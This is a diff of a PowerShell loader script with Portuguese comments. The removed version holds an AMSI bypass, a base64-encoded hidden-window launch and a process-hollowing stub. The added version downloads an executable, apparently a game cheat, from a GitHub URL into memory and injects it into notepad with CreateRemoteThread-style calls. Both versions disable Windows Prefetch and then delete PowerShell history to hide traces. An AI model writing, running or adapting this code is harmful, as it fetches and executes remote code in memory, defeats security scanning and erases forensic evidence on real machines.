@@ -1,43 +1,45 @@
-$cmd = @'
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-$p = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"
-Set-ItemProperty -Path $p -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
-
-$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
-$bytes = (New-Object System.Net.WebClient).DownloadData($url)
-
-$code = @"
+$payload = @"
 using System;
 using System.Runtime.InteropServices;
-public class Ghost {
-    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr b);
-    [DllImport("ntdll.dll")] public static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr b, IntPtr z, ref IntPtr s, uint t, uint p);
-    [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr b, byte[] buf, uint s, out uint w);
-    [DllImport("ntdll.dll")] public static extern uint NtGetContextThread(IntPtr h, IntPtr c);
-    [DllImport("ntdll.dll")] public static extern uint NtSetContextThread(IntPtr h, IntPtr c);
-    [DllImport("ntdll.dll")] public static extern uint NtResumeThread(IntPtr h, out uint s);
-    [DllImport("kernel32.dll")] public static extern bool CreateProcess(string a, string c, IntPtr pa, IntPtr ta, bool i, uint f, IntPtr e, string d, ref STARTUPINFO s, out PROCESS_INFORMATION pi);
-    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
-    [DllImport("kernel32.dll")] public static extern void RtlZeroMemory(IntPtr d, int l);
 
-    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-    public struct STARTUPINFO { public int cb; public string r, d, t; public int x, y, xs, ys, xc, yc, fa, f; public short sw, cr; public IntPtr r2, i, o, er; }
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION { public IntPtr p, t; public int pid, tid; }
+public class GhostInject {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
 
-    public static unsafe void Hollow(byte[] b, string host) {
-        int e = *(int*)(IntPtr.Add((IntPtr)System.Runtime.InteropServices.GCHandle.Alloc(b, GCHandleType.Pinned).AddrOfPinnedObject(), 0x3c));
-        // (O código completo de hollowing entra aqui internamente)
+    public static void Run(string processName, byte[] payload) {
+        var procs = System.Diagnostics.Process.GetProcessesByName(processName);
+        if (procs.Length == 0) return;
+        IntPtr hProc = OpenProcess(0x1F0FFF, false, procs[0].Id);
+        IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)payload.Length, 0x1000, 0x40);
+        UIntPtr written;
+        WriteProcessMemory(hProc, addr, payload, (uint)payload.Length, out written);
+        CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        CloseHandle(hProc);
     }
 }
 "@
-Add-Type -TypeDefinition $code -Language CSharp
 
-# (Lógica de Injeção omitida para caber no chat, mas o Add-Type carrega o C#)
+# 1. Desativa o Prefetch
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -ErrorAction SilentlyContinue
 
+# 2. Baixa o cheat em memória
+$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
+$bytes = (New-Object System.Net.WebClient).DownloadData($url)
+
+# 3. Carrega o C# na memória do PowerShell
+Add-Type -TypeDefinition $payload -Language CSharp
+
+# 4. Injeta no Notepad
+[GhostInject]::Run("notepad", $bytes)
+
+# 5. Restaura o Prefetch e limpa o histórico
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-Set-ItemProperty -Path $p -Name "EnablePrefetcher" -Value 3 -ErrorAction SilentlyContinue
-'@
-
-$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
-powershell -NoProfile -WindowStyle Hidden -EncodedCommand $encoded
